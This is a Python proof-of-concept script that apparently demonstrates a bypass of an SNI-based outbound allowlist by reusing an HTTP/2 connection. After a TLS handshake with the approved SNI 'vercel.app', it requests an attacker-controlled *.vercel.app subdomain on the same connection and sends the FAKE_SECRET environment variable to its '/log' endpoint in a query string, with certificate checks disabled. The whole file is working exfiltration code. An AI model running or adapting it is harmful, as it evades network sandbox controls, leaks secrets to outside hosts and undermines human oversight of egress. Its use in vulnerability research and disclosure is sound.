import os
import socket
import ssl
import h2.connection
import h2.events

# === Target configuration ===
TARGET_IP = "216.198.79.67"  # vercel.app's resolved IP (works for any *.vercel.app target)
ALLOWED_SNI = "vercel.app"
TARGET_AUTHORITY = "smiley-omega.vercel.app"  # attacker-controlled *.vercel.app subdomain
EXFIL_PATH = "/log"  # logging endpoint on the attacker-controlled subdomain
# ================================================================

FAKE_SECRET = os.environ.get("FAKE_SECRET", "no-secret-set")

def fetch_h2(sock_conn, h2conn, authority, stream_id, path="/"):
    h2conn.send_headers(stream_id, [
        (":method", "GET"), (":path", path),
        (":scheme", "https"), (":authority", authority),
    ], end_stream=True)
    sock_conn.sendall(h2conn.data_to_send())

    status, headers, body = None, None, b""
    done = False

    while not done:
        data = sock_conn.recv(65535)
        if not data:
            break

        for event in h2conn.receive_data(data):
            if isinstance(event, h2.events.ResponseReceived):
                headers = event.headers
                status = dict(headers).get(b":status", b"?").decode()

            if isinstance(event, h2.events.DataReceived):
                body += event.data
                h2conn.acknowledge_received_data(len(event.data), stream_id)

            if isinstance(event, h2.events.StreamEnded):
                done = True

        if h2conn.data_to_send():
            sock_conn.sendall(h2conn.data_to_send())

    return status, headers, body


# ============================================================
print("=" * 60)
print(f"STEP 1: Baseline - fresh connection to APPROVED domain ({ALLOWED_SNI})")
print("=" * 60)

try:
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    sock1 = socket.create_connection((TARGET_IP, 443), timeout=10)
    tls1 = ctx.wrap_socket(sock1, server_hostname=ALLOWED_SNI)

    print(f"[+] TLS handshake SUCCEEDED with SNI={ALLOWED_SNI}, ALPN={tls1.selected_alpn_protocol()}")

    conn1 = h2.connection.H2Connection()
    conn1.initiate_connection()
    tls1.sendall(conn1.data_to_send())

    status, headers, body = fetch_h2(tls1, conn1, ALLOWED_SNI, 1)

    print(f"[+] Response status: {status}")
    print(f"[+] Body (first 200 bytes): {body[:200]}")

    tls1.close()

except Exception as e:
    print(f"[-] FAILED: {e}")


# ============================================================
print("\n" + "=" * 60)
print(f"STEP 2: Control - fresh, DIRECT connection to UNAPPROVED domain ({TARGET_AUTHORITY})")
print("(expect this to fail/be rejected)")
print("=" * 60)

try:
    ctx2 = ssl.create_default_context()
    ctx2.set_alpn_protocols(["h2"])
    ctx2.check_hostname = False
    ctx2.verify_mode = ssl.CERT_NONE

    sock2 = socket.create_connection((TARGET_IP, 443), timeout=10)
    tls2 = ctx2.wrap_socket(sock2, server_hostname=TARGET_AUTHORITY)

    print(f"[+] TLS handshake SUCCEEDED with SNI={TARGET_AUTHORITY} (unexpected!)")

    conn2 = h2.connection.H2Connection()
    conn2.initiate_connection()
    tls2.sendall(conn2.data_to_send())

    status, headers, body = fetch_h2(tls2, conn2, TARGET_AUTHORITY, 1)

    print(f"[+] Response status: {status}")

    tls2.close()

except Exception as e:
    print(f"[-] FAILED as expected: {e}")


# ============================================================
print("\n" + "=" * 60)
print(f"STEP 3: THE BYPASS - connect with APPROVED SNI, then request UNAPPROVED authority on SAME connection")
print(f"        Exfiltrating FAKE_SECRET env var via query param")
print("=" * 60)

try:
    ctx3 = ssl.create_default_context()
    ctx3.set_alpn_protocols(["h2"])
    ctx3.check_hostname = False
    ctx3.verify_mode = ssl.CERT_NONE

    sock3 = socket.create_connection((TARGET_IP, 443), timeout=10)
    tls3 = ctx3.wrap_socket(sock3, server_hostname=ALLOWED_SNI)

    print(f"[+] TLS handshake completed with APPROVED SNI={ALLOWED_SNI}")

    conn3 = h2.connection.H2Connection()
    conn3.initiate_connection()
    tls3.sendall(conn3.data_to_send())

    status1, _, _ = fetch_h2(tls3, conn3, ALLOWED_SNI, 1)
    print(f"[+] Stream 1 ({ALLOWED_SNI}) status: {status1}")

    exfil_path = f"{EXFIL_PATH}?secret={FAKE_SECRET}"
    print(f"[+] Now reusing SAME connection for {TARGET_AUTHORITY} (no new handshake)...")
    print(f"[+] Sending exfil path with env var value: {exfil_path}")

    status3, headers3, body3 = fetch_h2(tls3, conn3, TARGET_AUTHORITY, 3, path=exfil_path)

    print(f"[+] Stream 3 ({TARGET_AUTHORITY}) status: {status3}")
    print(f"[+] Stream 3 headers: {headers3}")
    print(f"[+] Stream 3 body (first 300 bytes): {body3[:300]}")

    tls3.close()

    print("\n" + "=" * 60)

    if status3 and status3 not in ("000", None):
        print(f"CONCLUSION: BYPASS CONFIRMED - secret exfiltrated to {TARGET_AUTHORITY} via connection reuse (status {status3})")
        print("despite Step 2 showing a direct connection to it fails/is rejected.")
        print("Check your /log page to confirm receipt.")
    else:
        print("CONCLUSION: No bypass observed.")

    print("=" * 60)

except Exception as e:
    print(f"[-] Step 3 error: {e}")
